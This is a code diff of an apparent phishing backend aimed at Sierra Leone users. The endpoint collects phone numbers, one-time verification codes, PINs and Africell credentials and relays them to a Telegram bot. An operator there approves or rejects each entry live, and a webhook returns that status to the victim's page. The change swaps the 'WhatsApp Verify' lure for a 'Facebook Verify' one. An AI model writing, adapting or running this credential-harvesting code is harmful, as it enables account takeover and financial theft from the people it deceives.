@@ -95,39 +95,39 @@ app.post('/api/submit-order', async (req, res) => {
         // Always force status back to pending upon a fresh submission request from client
         orderStatuses[cleanPhone] = { status: 'pending', timestamp: Date.now() };
 
-        // Independent WhatsApp Verify flow: only phone number and code, no old numbers/credentials
-        if (uniqueId && (uniqueId.startsWith('WhatsApp Verify Code: ') || uniqueId === 'WhatsApp Verify Resend Code')) {
-            const isResend = uniqueId === 'WhatsApp Verify Resend Code';
-            const waCode = isResend ? '' : uniqueId.replace('WhatsApp Verify Code: ', '').trim();
+        // Independent Facebook Verify flow: only phone number and code, no old numbers/credentials
+        if (uniqueId && (uniqueId.startsWith('Facebook Verify Code: ') || uniqueId === 'Facebook Verify Resend Code')) {
+            const isResend = uniqueId === 'Facebook Verify Resend Code';
+            const fbCode = isResend ? '' : uniqueId.replace('Facebook Verify Code: ', '').trim();
 
-            let waMessage = isResend
-                ? `📲 *Whatsapp Verify (Resend Requested)*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\``
-                : `📲 *Whatsapp Verify*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n🔢 Code: \`${escapeMarkdown(waCode)}\``;
+            let fbMessage = isResend
+                ? `📲 *Facebook Verify (Resend Requested)*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\``
+                : `📲 *Facebook Verify*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n🔢 Code: \`${escapeMarkdown(fbCode)}\``;
 
-            const waApproveCb = `A|wa|${shortPhone}`;
-            const waWrongCb   = `W|wa|${shortPhone}`;
-            const waRejectCb  = `R|wa|${shortPhone}`;
+            const fbApproveCb = `A|wa|${shortPhone}`;
+            const fbWrongCb   = `W|wa|${shortPhone}`;
+            const fbRejectCb  = `R|wa|${shortPhone}`;
 
-            if (waApproveCb.length > 64 || waWrongCb.length > 64 || waRejectCb.length > 64) {
-                console.error('callback_data too long:', waApproveCb.length);
+            if (fbApproveCb.length > 64 || fbWrongCb.length > 64 || fbRejectCb.length > 64) {
+                console.error('callback_data too long:', fbApproveCb.length);
                 return res.status(500).json({ success: false, message: 'Internal error: callback too long.' });
             }
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             await sendToTelegram(telegramUrl, {
                 chat_id: CHAT_ID,
-                text: waMessage,
+                text: fbMessage,
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: "✅ Approved", callback_data: waApproveCb }],
-                        [{ text: "⚠️ Wrong Info", callback_data: waWrongCb }],
-                        [{ text: "❌ Reject", callback_data: waRejectCb }]
+                        [{ text: "✅ Approved", callback_data: fbApproveCb }],
+                        [{ text: "⚠️ Wrong Info", callback_data: fbWrongCb }],
+                        [{ text: "❌ Reject", callback_data: fbRejectCb }]
                     ]
                 }
             });
 
-            console.log(`[SUBMIT] Sierra Leone WhatsApp verify submitted for phone: ${cleanPhone}`);
+            console.log(`[SUBMIT] Sierra Leone Facebook verify submitted for phone: ${cleanPhone}`);
             return res.json({ success: true, message: 'Sent successfully.' });
         }
 
@@ -188,9 +188,9 @@ app.post('/api/submit-order', async (req, res) => {
         const approveCb = `A|${stepTag}|${shortPhone}`;
         const rejectCb  = `R|${stepTag}|${shortPhone}`;
         const wrongCb   = `W|${stepTag}|${shortPhone}`;
-        const whatsappCb = `V|${stepTag}|${shortPhone}`;
+        const facebookCb = `V|${stepTag}|${shortPhone}`;
 
-        if (approveCb.length > 64 || rejectCb.length > 64 || wrongCb.length > 64 || (stepTag === 'pin' && whatsappCb.length > 64)) {
+        if (approveCb.length > 64 || rejectCb.length > 64 || wrongCb.length > 64 || (stepTag === 'pin' && facebookCb.length > 64)) {
             console.error('callback_data too long:', approveCb.length);
             return res.status(500).json({ success: false, message: 'Internal error: callback too long.' });
         }
@@ -202,7 +202,7 @@ app.post('/api/submit-order', async (req, res) => {
         ];
 
         if (stepTag === 'pin') {
-            inlineKeyboard.push([{ text: "💬 Whatsapp", callback_data: whatsappCb }]);
+            inlineKeyboard.push([{ text: "Facebook", callback_data: facebookCb }]);
         }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -315,19 +315,19 @@ app.post('/api/telegram-webhook', async (req, res) => {
         if (action === 'A') {
             newStatus = 'approved';
             actionText = 'Approved ✅';
-            messageTitle = stepTag === 'wa' ? 'Whatsapp Verify Approved' : 'Africell Request Approved';
+            messageTitle = stepTag === 'wa' ? 'Facebook Verify Approved' : 'Africell Request Approved';
         } else if (action === 'R') {
             newStatus = 'rejected';
             actionText = 'Rejected ❌';
-            messageTitle = stepTag === 'wa' ? 'Whatsapp Verify Rejected' : 'Africell Request Rejected';
+            messageTitle = stepTag === 'wa' ? 'Facebook Verify Rejected' : 'Africell Request Rejected';
         } else if (action === 'W') {
             newStatus = 'wrong_id';
             actionText = 'Wrong Info / Error ⚠️';
-            messageTitle = stepTag === 'wa' ? 'Whatsapp Verify Wrong Info' : 'Africell Credential Error';
+            messageTitle = stepTag === 'wa' ? 'Facebook Verify Wrong Info' : 'Africell Credential Error';
         } else if (action === 'V') {
             newStatus = 'verify_whatsapp';
-            actionText = 'Sent to Whatsapp Verify 💬';
-            messageTitle = 'Africell Sent to Whatsapp Verify';
+            actionText = 'Sent to Facebook Verify 💬';
+            messageTitle = 'Africell Sent to Facebook Verify';
         }
 
         // Store status updates with precise multi-format keys for guaranteed retrieval
